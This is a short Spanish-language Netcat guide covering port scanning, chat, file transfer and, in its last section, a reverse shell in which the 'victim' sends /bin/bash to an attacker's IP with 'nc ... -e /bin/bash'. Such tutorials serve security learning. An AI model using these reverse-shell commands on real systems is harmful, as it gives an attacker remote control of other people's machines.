# **Guía de Netcat** ⚔
Netcat (nc) es una herramienta poderosa que permite escanear puertos, transferir archivos, chatear y establecer shells remotas.

1. ¿Qué es Netcat?

Netcat es una herramienta de red que permite leer y escribir datos en conexiones a través de TCP y UDP. Se usa para depuración de redes, pruebas de seguridad y automatización de tareas.


*   **Instalación:**

>
    sudo apt update && sudo apt install netcat -y


2. Escaneo de Puertos (Port Scanning)

Netcat puede usarse como un escáner de puertos básico.


*   TCP

>
      nc -zv <IP> <PUERTO_INICIAL>-<PUERTO_FINAL>

      ejemplo:

      nc -zv 192.168.1.1 20-100

    -z: No envía datos, solo verifica si los puertos están abiertos.
    -v: Modo verbose (muestra información detallada)

*   UDP

>

      nc -zvu <IP> <PUERTO>

      ejemplo:

      nc -zvu 192.168.1.1 53

    -z: No envía datos, solo verifica si los puertos están abiertos.
    -v: Modo verbose (muestra información detallada)
    -u: Fuerza el uso de UDP.




3. Chat con Netcat

Podemos establecer una comunicación interactiva entre dos máquinas.

🔹 Paso 1 (Servidor) - Escuchar conexiones en un puerto
>
    nc -nlvp 4444
    
    -l: Escucha conexiones entrantes
    -v: Muestra información detallada
    -p: Especifica un puerto de origen
    -n: Evita la resolución DNS (más rápido y discreto)

🔹 Paso 2 (Cliente) - Conectar al servidor
>
    nc <IP_DEL_SERVIDOR> 4444


4. Transferencia de Archivos con Netcat

Podemos enviar archivos de una máquina a otra.

🔹 Enviar archivo desde el Cliente

>
    nc <IP_DESTINO> 4444 < archivo.txt

🔹 Recibir archivo en el Servidor

>
    nc -nlvp 4444 > archivo.txt

 Esto transfiere archivo.txt de un equipo a otro sin autenticación.


5. Reverse Shell en Linux

¿Qué es una Reverse Shell?

Una reverse shell permite que una máquina víctima se conecte a un atacante y le proporcione acceso remoto.


🔹 Paso 1 (Atacante - Escuchar conexión en su máquina)
>
    nc -nlvp 4444

🔹 Paso 2 (Víctima - Enviar una shell al atacante)
>
    nc <IP_ATACANTE> <PUERTO> -e /bin/bash

    ejemplo:

    nc 192.168.1.100 4444 -e /bin/bash

 Esto enviará una shell directamente al atacante.
